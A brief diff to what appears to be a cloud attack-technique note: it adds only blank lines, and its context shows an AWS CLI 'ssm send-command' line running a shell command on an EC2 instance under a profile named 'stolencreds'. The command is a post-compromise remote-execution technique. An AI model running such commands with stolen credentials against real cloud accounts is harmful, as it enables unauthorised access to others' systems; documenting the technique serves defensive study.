@@ -16,3 +16,5 @@ updated_at: '2023-04-10T20:20:49.939502+00:00'
 ```bash
 $ aws ssm send-command --instance-ids "INSTANCE-ID-HERE" --document-name "AWS-RunShellScript" --comment "IP Config" --parameters commands=ifconfig --output text --query "Command.CommandId" --profile stolencreds
 ```
+
+
